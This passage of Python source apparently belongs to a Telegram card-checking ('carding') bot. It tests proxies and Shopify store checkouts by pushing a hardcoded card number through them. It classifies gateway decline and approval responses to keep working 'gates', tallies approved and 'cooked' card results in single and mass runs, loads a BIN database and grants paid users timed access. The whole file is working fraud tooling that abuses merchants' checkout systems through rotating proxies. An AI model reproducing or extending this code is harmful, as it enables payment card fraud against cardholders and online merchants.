                        f"🔍 Checking {total_count} sites...\n\n❌ Skipped (no response): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
            except:
                pass
        
        # Small delay to avoid rate limiting
        time.sleep(1)
    
    # Save updated sites
    save_json(SITES_FILE, sites_data)
    
    # Final update with proxy info
    if proxy:
        final_message = f"✅ Site Checking Completed with Proxy!\n\nProxy Used: {proxy.split(':')[0]}\nAdded: {added_count} new sites\nSkipped: {skipped_count} sites\nTotal Sites: {len(sites_data['sites'])}"
    else:
        final_message = f"✅ Site Checking Completed (No Proxy Available)!\n\nAdded: {added_count} new sites\nSkipped: {skipped_count} sites\nTotal Sites: {len(sites_data['sites'])}"
    
    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )


def process_single_proxy(bot, message, proxy):
    """Repaired Smart Proxy Adder: Async-safe and robust validation"""
    def run_validation():
        try:
            # 1. Validate Format
            proxy_str = proxy.strip()
            parts = proxy_str.split(':')
            if len(parts) not in [2, 4]:
                bot.edit_message_text("❌ Format: ip:port:user:pass", message.chat.id, message.message_id)
                return

            status_msg_id = message.message_id
            host = parts[0]
            user_id = str(message.chat.id) 
            
            # 2. Basic Connectivity Test (Using your fixed test_proxy_connectivity)
            # We use a 5-10s timeout here to keep the bot snappy
            is_alive = test_proxy_connectivity(proxy_str)
            
            if not is_alive:
                bot.edit_message_text(f"❌ <b>Dead Proxy:</b> Connection failed.", message.chat.id, status_msg_id, parse_mode='HTML')
                return

            # 3. Shopify Quality Check
            is_shopify_working = False
            shopify_response = "Skipped"
            
            # Use random site from your loaded sites_data
            if sites_data.get('sites'):
                try:
                    site_obj = random.choice(sites_data['sites'])
                    bot.edit_message_text(f"✅ Connected! Testing Shopify...", message.chat.id, status_msg_id)
                    
                    # Direct check
                    response = check_shopify_api(site_obj['url'], "5242430428405662|03|28|323", proxy_str)
                    
                    response_str = str(response).upper() if response else ""
                    live_keywords = [
                        'CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                        'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                        'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 
                        'INCORRECT_NUMBER', 'INVALID_TOKEN', 'AUTHENTICATION_ERROR',
                        'DECLINED', 'APPROVED', 'GENERIC_ERROR', 'ERROR',
                        'SECURITY CODE', 'INVALID', 'CARD', 'FUNDS', 'MATCH', 
                        'ZIP', 'AVS', 'STOCK', 'LOGIN'
                       ]
                    
                    if any(k in response_str for k in valid_keywords):
                        is_shopify_working = True
                        shopify_response = "Live Gateway"
                    else:
                        shopify_response = "Bad Response"
                except:
                    shopify_response = "Check Failed"
            
            # 4. Save Logic (Personal and Server)
            # Ensure dictionary exists in memory
            if user_id not in user_proxies_data:
                user_proxies_data[user_id] = []
                
            if proxy_str not in user_proxies_data[user_id]:
                user_proxies_data[user_id].append(proxy_str)
                save_json(USER_PROXIES_FILE, user_proxies_data)
                
            if proxy_str not in proxies_data['proxies']:
                proxies_data['proxies'].append(proxy_str)
                save_json(PROXIES_FILE, proxies_data)

            # 5. Final UI Update
            emoji = "🔥" if is_shopify_working else "✅"
            shop_status = "<b>Working</b>" if is_shopify_working else shopify_response
            
            msg = (f"{emoji} <b>Proxy Added Successfully</b>\n\n"
                   f"🌐 <code>{host}</code>\n"
                   f"✅ Connectivity: <b>Live</b>\n"
                   f"🛍️ Shopify: {shop_status}")
            
            bot.edit_message_text(msg, message.chat.id, status_msg_id, parse_mode='HTML')

        except Exception as e:
            logger.error(f"Proxy Add Thread Error: {e}")

    # Launch in thread to prevent bot freezing
    threading.Thread(target=run_validation).start()


def process_proxy_file_checking(bot, message, proxies_list, status_msg):
    """Test proxies from file one by one with live progress"""
    try:
        total_proxies = len(proxies_list)
        added = 0
        duplicates = 0
        failed = 0
        
        start_time = time.time()
        
        try:
            bot.edit_message_text(
                f"🔍 Starting proxy testing...\n\nTotal to test: {total_proxies}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        time.sleep(0.5)
        
        for idx, proxy in enumerate(proxies_list, 1):
            proxy = proxy.strip()
            if not proxy or proxy.startswith('#'):
                continue
            
            proxy_parts = proxy.split(':')
            if len(proxy_parts) != 4:
                failed += 1
                continue
            
            host = proxy_parts[0]
            port = proxy_parts[1]
            
            try:
                progress_text = format_proxy_progress(
                    idx, total_proxies, 
                    added, duplicates, failed,
                    f"Testing {host}:{port}..."
                )
                bot.edit_message_text(
                    progress_text,
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
            
            if not test_proxy_connectivity(proxy):
                failed += 1
                continue
            
            if sites_data.get('sites') and len(sites_data['sites']) > 0:
                try:
                    site_obj = random.choice(sites_data['sites'])
                    test_cc = "5242430428405662|03|28|323"
                    response = test_proxy_with_api(site_obj['url'], test_cc, proxy)
                    
                    if response:
                        response_upper = str(response).upper() if isinstance(response, (str, dict)) else ""
                        if isinstance(response, dict):
                            response_upper = response.get("Response", "").upper()
                        
                        valid_responses = [
                            'CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD',
                            'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS',
                            'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED',
                            'INCORRECT_NUMBER', 'INVALID_TOKEN', 'AUTHENTICATION_ERROR'
                        ]
                        
                        if any(x in response_upper for x in valid_responses):
                            if proxy not in proxies_data['proxies']:
                                proxies_data['proxies'].append(proxy)
                                added += 1
                            else:
                                duplicates += 1
                        else:
                            failed += 1
                    else:
                        failed += 1
                except:
                    failed += 1
            else:
                failed += 1
            
            time.sleep(0.3)
        
        try:
            save_json(PROXIES_FILE, proxies_data)
        except:
            logger.error("Failed to save proxies")
        
        duration = time.time() - start_time
        
        try:
            final_msg = format_proxy_final_results(
                total_proxies, added, duplicates, failed, 
                duration, len(proxies_data['proxies'])
            )
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
    
    except Exception as e:
        try:
            bot.reply_to(message, f"❌ Error during proxy checking: {str(e)}")
        except:
            logger.error(f"Error: {e}")


def format_proxy_progress(current, total, added, duplicates, failed, current_status):
    """Format proxy testing progress"""
    percent = (current / total * 100) if total > 0 else 0
    bar_length = 20
    filled = int(bar_length * current / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_length - filled)
    
    return f"""
┏━━━━━━━⍟
┃ <b>🔍 PROXY TESTING</b> ⚡
┗━━━━━━━━━━━⊛

<code>{bar}</code>
<b>Progress:</b> {current}/{total} ({percent:.1f}%)

<b>Status:</b> {current_status}

<b>Results So Far:</b>
[⌬] <b>✅ Added</b>↣ {added}
[⌬] <b>⚠️ Duplicates</b>↣ {duplicates}
[⌬] <b>❌ Failed</b>↣ {failed}

⏳ Testing...
"""


def format_proxy_final_results(total, added, duplicates, failed, duration, total_proxies):
    """Format final proxy testing results"""
    speed = (total / duration) if duration > 0 else 0
    
    return f"""
┏━━━━━━━⍟
┃ <b>✅ PROXY TESTING COMPLETED</b>
┗━━━━━━━━━━━⊛

<b>━━━ RESULTS ━━━</b>
[⌬] <b>✅ Added</b>↣ {added} 🎉
[⌬] <b>⚠️ Duplicates</b>↣ {duplicates} ⚠️
[⌬] <b>❌ Failed</b>↣ {failed} ❌
[⌬] <b>Tested</b>↣ {total}

<b>━━━ STATS ━━━</b>
[⌬] <b>Duration</b>↣ {duration:.2f}s
[⌬] <b>Speed</b>↣ {speed:.1f} proxies/sec
[⌬] <b>Total Proxies Saved</b>↣ {total_proxies} 💾

━━━━━━━━━━━━━━━━━━━━
"""


# def test_proxy_connectivity(proxy):
#     """Test if proxy can connect"""
#     try:
#         proxy_parts = proxy.split(':')
#         if len(proxy_parts) != 4:
#             return False
        
#         host, port, user, password = proxy_parts
#         proxy_url = f"http://{user}:{password}@{host}:{port}"
        
#         session = requests.Session()
#         response = session.get(
#             "https://api.ipify.org",
#             proxies={'https': proxy_url, 'http': proxy_url},
#             timeout=10,
#             verify=False
#         )
#         return response.status_code == 200
#     except:
#         return False


# def test_proxy_with_api(url, cc, proxy):
#     """Test proxy with API call"""
#     try:
#         proxy_parts = proxy.split(':')
#         if len(proxy_parts) != 4:
#             return None
        
#         host, port, user, password = proxy_parts
#         proxy_url = f"http://{user}:{password}@{host}:{port}"
        
#         session = requests.Session()
#         response = session.post(
#             url,
#             data={'cc': cc},
#             proxies={'https': proxy_url, 'http': proxy_url},
#             timeout=15,
#             verify=False
#         )
        
#         try:
#             return response.json()
#         except:
#             return response.text if response.text else None
#     except:
#         return None

def test_proxy_connectivity(proxy):
    """Test if proxy can connect"""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) != 4:
            return False
        
        host, port, user, password = proxy_parts
        proxy_url = f"http://{user}:{password}@{host}:{port}"
        
        session = requests.Session()
        response = session.get(
            "https://api.ipify.org",
            proxies={'https': proxy_url, 'http': proxy_url},
            timeout=20,
            verify=False
        )
        return response.status_code == 200
    except:
        return False


def test_proxy_with_api(site_url, test_cc, proxy):
    """
    Test proxy using direct Shopify checkout (no external API)
    """
    return check_shopify_api(site_url, test_cc, proxy)



def test_proxy_connectivity(proxy):
    """Test if proxy is reachable"""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            proxy_dict = {
                'http': f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}',
                'https': f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}'
            }
            
            # Test with a simple HTTP request
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=20,
                verify=False
            )
            return response.status_code == 200
    except:
        pass
    
    return False

        

@bot.message_handler(commands=['testproxy'])
def handle_test_proxy(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Owner only command.")
        return
        
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /testproxy host:port:user:pass")
        return
    
    proxy = message.text.split(' ', 1)[1]
    proxy_parts = proxy.split(':')
    
    if len(proxy_parts) != 4:
        bot.reply_to_message(message, "Invalid proxy format")
        return
    
    status_msg = bot.reply_to(message, "🔍 Running comprehensive proxy test...")
    
    tests = []
    
    # Test 1: Basic connectivity
    try:
        test1 = test_proxy_connectivity(proxy)
        tests.append(f"✅ Connectivity: {'PASS' if test1 else 'FAIL'}")
    except Exception as e:
        tests.append(f"❌ Connectivity: ERROR - {str(e)}")
    
    # Test 2: Direct API call
    try:
        site_obj = random.choice(sites_data['sites']) if sites_data['sites'] else None
        if site_obj:
            response = check_shopify_api(site_obj['url'], "5242430428405662|03|28|323", proxy)
            tests.append(f"✅ Direct API: {'PASS' if response and is_valid_response(response) else 'FAIL'}")
            if response:
                tests.append(f"   Response: {response.get('Response', 'None')}")
        else:
            tests.append("❌ Direct API: No sites available")
    except Exception as e:
        tests.append(f"❌ Direct API: ERROR - {str(e)}")
    
    # Test 3: Proxy dict method
    try:
        if site_obj:
            response = check_shopify_api(site_obj['url'], "5242430428405662|03|28|323", proxy)
            tests.append(f"✅ Proxy Dict: {'PASS' if response and is_valid_response(response) else 'FAIL'}")
            if response:
                tests.append(f"   Response: {response.get('Response', 'None')}")
    except Exception as e:
        tests.append(f"❌ Proxy Dict: ERROR - {str(e)}")
    
    # Compile results
    result_text = f"🔍 Proxy Test Results for {proxy_parts[0]}:\n\n" + "\n".join(tests)
    bot.edit_message_text(result_text, chat_id=message.chat.id, message_id=status_msg.message_id)

@bot.message_handler(commands=['clean'])
def handle_clean_sites(message):
    if not is_owner(message.from_user.id):
        return
    
    # Correctly call the function here
    thread = threading.Thread(target=process_clean_sites, args=(message,))
    thread.start()

# ==========================================
# REPLACE process_clean_proxies IN app.py
# ==========================================

def process_clean_sites(message):
    try:
        if not sites_data['sites']:
            bot.reply_to(message, "❌ No sites to clean.")
            return

        total_sites = len(sites_data['sites'])
        status_msg = bot.reply_to(message, f"🧹 **Cleaning {total_sites} sites...**", parse_mode='Markdown')
        
        valid_sites = []
        test_cc = "5242430428405662|03|28|323"
        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

        for i, site_obj in enumerate(sites_data['sites']):
            if i % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"🧹 **Cleaning Sites...**\n\n"
                        f"Checking: {site_obj['url']}\n"
                        f"Progress: {i}/{total_sites}\n"
                        f"✅ Valid: {len(valid_sites)}\n"
                        f"❌ Removed: {i - len(valid_sites)}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass

            try:
                from gates import check_shopify_api, process_shopify_api_response
                api_resp = check_shopify_api(site_obj['url'], test_cc, proxy)
                response_text, status, gateway = process_shopify_api_response(api_resp, site_obj.get('price', '0.00'))
                if status != 'ERROR' and "CAPTCHA" not in response_text.upper():
                    site_obj['last_response'] = response_text[:30]
                    valid_sites.append(site_obj)

            except Exception as e:
                print(f"⚠️ Error checking site {site_obj.get('url')}: {e}")
                continue

            time.sleep(0.5)

        sites_data['sites'] = valid_sites
        save_json(SITES_FILE, sites_data)

        removed = total_sites - len(valid_sites)
        bot.edit_message_text(
            f"✅ **Site Cleaning Finished!**\n\n"
            f"🗑 Removed: {removed}\n"
            f"💎 Active Sites: {len(valid_sites)}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Critical Error: {e}")
        traceback.print_exc()


@bot.message_handler(commands=['cleanpro'])
def handle_clean_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=process_clean_proxies, args=(message,))
    thread.start()

def process_clean_proxies(message):
    try:
        if not proxies_data['proxies']:
            bot.reply_to(message, "❌ No proxies to clean.")
            return

        total_proxies = len(proxies_data['proxies'])
        status_msg = bot.reply_to(message, f"🧹 Cleaning {total_proxies} proxies...")

        valid_proxies = []
        test_cc = "5242430428405662|03|28|323"
        if not sites_data['sites']:
            bot.edit_message_text("❌ No sites available to test proxies.", message.chat.id, status_msg.message_id)
            return
        site_obj = random.choice(sites_data['sites'])
        site_url = site_obj['url']

        for i, proxy in enumerate(proxies_data['proxies']):
            if i % 5 == 0:
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_proxies} proxies...\n\nChecking: {proxy.split(':')[0]}\nChecked: {i}/{total_proxies}\nValid: {len(valid_proxies)}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass

            try:
                from gates import check_shopify_api, process_shopify_api_response
                api_resp = check_shopify_api(site_url, test_cc, proxy)
                response_text, status, gateway = process_shopify_api_response(api_resp, site_obj.get('price', '0.00'))

                if status != 'ERROR' and "CAPTCHA" not in response_text.upper():
                    valid_proxies.append(proxy)
            except:
                pass

            time.sleep(0.3)

        proxies_data['proxies'] = valid_proxies
        save_json(PROXIES_FILE, proxies_data)

        removed = total_proxies - len(valid_proxies)
        bot.edit_message_text(
            f"✅ Proxy cleaning completed!\nRemoved: {removed}\nLive: {len(valid_proxies)}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
        traceback.print_exc()


@bot.message_handler(commands=['rmsites'])
def handle_remove_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(sites_data['sites'])
    sites_data['sites'] = []
    save_json(SITES_FILE, sites_data)
    bot.reply_to(message, f"✅ All {count} sites removed.")

@bot.message_handler(commands=['rmpro'])
def handle_remove_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(proxies_data['proxies'])
    proxies_data['proxies'] = []
    save_json(PROXIES_FILE, proxies_data)
    bot.reply_to(message, f"✅ All {count} proxies removed.")

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return

    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"

    stats_msg = f"""
┏━━━━━━━⍟
┃ <strong>📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬</strong> 📈
┗━━━━━━━━━━━⊛

[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐒𝐢𝐭𝐞𝐬</strong> ↣ <code>{len(sites_data['sites'])}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐢𝐞𝐬</strong> ↣ <code>{len(proxies_data['proxies'])}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐔𝐩𝐭𝐢𝐦𝐞</strong> ↣ <code>{uptime_str}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['approved']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['cooked']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐃𝐞𝐜𝐜𝐥𝐢𝐧𝐞𝐓 ❌</strong> ↣ <code>{stats_data['declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐌𝐚𝐬𝐬 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['mass_approved']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐌𝐎𝐬𝐬 𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['mass_cooked']}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐌𝐚𝐬𝐬 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</strong> ↣ <code>{stats_data['mass_declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬</strong> ↣ <code>{stats_data['approved'] + stats_data['cooked'] + stats_data['declined'] + stats_data['mass_approved'] + stats_data['mass_cooked'] + stats_data['mass_declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
"""

    bot.reply_to(message, stats_msg, parse_mode="HTML")

@bot.message_handler(commands=['viewsites'])
def handle_view_sites(message):
    if not is_owner(message.from_user.id):
        return
    sites = sites_data.get('sites', [])
    if not sites:
        bot.reply_to(message, "No sites available.")
        return
    
    text = "<b>🌐 Sites (ID – Price)</b>\n<pre>"
    for site in sites[:30]:
        text += f"{site['id']:>4}  –  ${site.get('price', '0.00'):>6}\n"
    text += "</pre>"
    if len(sites) > 30:
        text += f"\n... and {len(sites)-30} more"
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['ping'])
def handle_ping(message):
    start_time = time.time()
    ping_msg = bot.reply_to(message, "<strong>🏓 Pong! Checking response time...</strong>", parse_mode="HTML")
    end_time = time.time()
    response_time = round((end_time - start_time) * 1000, 2)
    
    # Calculate uptime
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"
    
    bot.edit_message_text(
        f"<strong>🏓 Pong!</strong>\n\n"
        f"<strong>Response Time:</strong> {response_time} ms\n"
        f"<strong>Uptime:</strong> {uptime_str}\n\n"
        f"<strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤Unknownop ꯭𖠌</a>",
        chat_id=message.chat.id,
        message_id=ping_msg.message_id,
        parse_mode="HTML"
    )


@bot.message_handler(commands=['restart'])
def handle_restart(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    restart_msg = bot.reply_to(message, "<strong>🔄 Restarting bot, please wait...</strong>", parse_mode="HTML")
    
    # Simulate restart process
    time.sleep(2)
    
    # Calculate uptime before restart
    uptime_seconds = int(time.time() - BOT_START_TIME)
    uptime_days = uptime_seconds // (24 * 3600)
    uptime_seconds %= (24 * 3600)
    uptime_hours = uptime_seconds // 3600
    uptime_seconds %= 3600
    uptime_minutes = uptime_seconds // 60
    uptime_seconds %= 60
    
    uptime_str = f"{uptime_days}d {uptime_hours}h {uptime_minutes}m {uptime_seconds}s"
    
    # Update the global start time without using global keyword
    # Since BOT_START_TIME is defined at module level, we can modify it directly
    # by using the global namespace
    globals()['BOT_START_TIME'] = time.time()
    
    bot.edit_message_text(
        f"<strong>✅ Bot restarted successfully!</strong>\n\n"
        f"<strong>Previous Uptime:</strong> {uptime_str}\n"
        f"<strong>Restart Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"<strong>Bot By:</strong> <a href='tg://user?id={DARKS_ID}'>⏤Unknownop ꯭𖠌</a>",
        chat_id=message.chat.id,
        message_id=restart_msg.message_id,
        parse_mode="HTML"
    )

@bot.message_handler(commands=['setamo'])
def handle_set_amount(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Get unique price ranges from sites
    prices = set()
    for site in sites_data['sites']:
        try:
            price = float(site.get('price', 0))
            if price > 0:
                # Round to nearest 5 for grouping
                rounded_price = ((price // 5) + 1) * 5
                prices.add(rounded_price)
        except:
            continue
    
    # Create price options
    price_options = [5, 10, 20, 30, 50, 100]
    
    # Add available prices that are not in standard options
    for price in sorted(prices):
        if price <= 100 and price not in price_options:
            price_options.append(price)
    
    # Sort and ensure we have reasonable options
    price_options = sorted(price_options)
    price_options = [p for p in price_options if p <= 100][:8]  # Limit to 8 options
    
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # Add price buttons
    for price in price_options:
        markup.add(types.InlineKeyboardButton(f"BELOW {price}$", callback_data=f"set_price_{price}"))
    
    # Add "No Filter" and "Cancel" buttons
    markup.add(types.InlineKeyboardButton("❌ No Filter (All Sites)", callback_data="set_price_none"))
    markup.add(types.InlineKeyboardButton("🚫 Cancel", callback_data="set_price_cancel"))
    
    # Get current filter status
    current_filter = price_filter if price_filter else "No Filter"
    
    bot.send_message(
        message.chat.id,
        f"<strong>💰 Set Price Filter</strong>\n\n"
        f"<strong>Current Filter:</strong> {current_filter}$\n"
        f"<strong>Available Sites:</strong> {len(sites_data['sites'])}\n\n"
        f"Select a price range to filter sites:",
        parse_mode="HTML",
        reply_markup=markup
    )

# ============================================================================
# 📂 FILE HANDLING HELPER FUNCTIONS
# ============================================================================
def is_user_allowed(userid):
    """Complete handler auth - owners + approved users"""
    if userid in OWNER_ID:
        return True
    try:
        userdata = users_data.get(str(userid))
        if not userdata:
            return False
        # Try both possible keys
        expiry_str = userdata.get('expiry') or userdata.get('expiry_date')
        if not expiry_str:
            return False
        expiry_date = datetime.fromisoformat(expiry_str)
        return datetime.now() <= expiry_date
    except:
        return False

def get_filtered_sites():
    """Returns LIST of sites (works with your array format)"""
    if isinstance(sites_data, list):
        sites_list = sites_data
    elif isinstance(sites_data, dict) and 'sites' in sites_data:
        sites_list = sites_data['sites']
    else:
        sites_list = []
    
    if price_filter is None:
        return sites_list
    return [s for s in sites_list if float(s.get('price', 999)) <= price_filter]

handler_utils = setup_complete_handler(
    bot,
    get_filtered_sites,
    proxies_data,
    check_shopify_api,               
    is_valid_response,
    process_shopify_api_response,   
    update_stats,
    save_json,
    load_json,
    is_user_allowed,
    users_data,
    USERS_FILE,
    force_subscribe_and_name
)

# Extract the exported utilities
set_user_busy = handler_utils['set_user_busy']
is_user_busy = handler_utils['is_user_busy']
set_stop = handler_utils['set_stop']
clear_stop = handler_utils['clear_stop']
is_stop_requested = handler_utils['is_stop_requested']
mass_check_semaphore = handler_utils['mass_check_semaphore']

def is_valid_response(api_response):
    """
    Advanced validation - checks the actual text response from Shopify
    """
    if not api_response:
        return False
    
    response_text = ""
    if isinstance(api_response, dict):
        # Grab the text from the response dictionary
        response_text = str(api_response.get("Response", "")) + " " + str(api_response.get("message", ""))
        
        # Also check the status field just in case it's a direct approval
        status = str(api_response.get('status', '')).upper()
        if status in ['APPROVED', 'APPROVED_OTP']:
            return True
    else:
        response_text = str(api_response)
        
    response_upper = response_text.upper()

    # 1. BLOCK bad sites (Merchandise mismatches, cart errors, system blocks)
    bad_keywords = ['MERCHANDISE_MISMATCH_ERROR', 'REJECTED', 'SYSTEM_ERROR', 'CONNECTION_ERROR', 'TIMEOUT']
    if any(bad in response_upper for bad in bad_keywords):
        return False

    # 2. ACCEPT valid gateway responses (Real Declines + Real Approvals)
    valid_keywords = [
        'CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
        'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
        'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , 
        'INCORRECT_NUMBER' , 'INVALID_TOKEN' , 'AUTHENTICATION_ERROR',
        'DO NOT HONOR', 'APPROVED', 'SUCCESS', 'ORDER CONFIRMED'
    ]
    
    return any(good in response_upper for good in valid_keywords)

# Ensure this line exists and loads the file
users_data = load_json(USERS_FILE, {}) 

# Debug Print (Optional: Add this right after loading to verify)
print(f"✅ Loaded {len(users_data)} allowed users.")

if __name__ == "__main__":
    import time
      
    
    print("🚀 Bot started...")
    try:
        from complete_handler import load_bin_database
        print("📂 Loading BIN Database...")
        load_bin_database()
        print("✅ BIN Database Loaded!")
    except ImportError:
        print("⚠️ Warning: Could not import load_bin_database")
    except Exception as e:
        print(f"❌ Error loading BINs: {e}")
    # 2. Then start the infinite loop for the bot
    while True:
        try:
            print("📡 Connecting to Telegram API...")
            # Added allowed_updates to ensure you get callback queries
            bot.infinity_polling(
                timeout=60, 
                long_polling_timeout=60, 
                allowed_updates=['message', 'document', 'callback_query'], 
                skip_pending=True
            )
        except KeyboardInterrupt:
            print("\n✅ Bot stopped by user")
            break
        except Exception as e:
            print(f"\n❌ Error: {e}")
            print("⏳ Reconnecting in 10 seconds...")
            time.sleep(10)
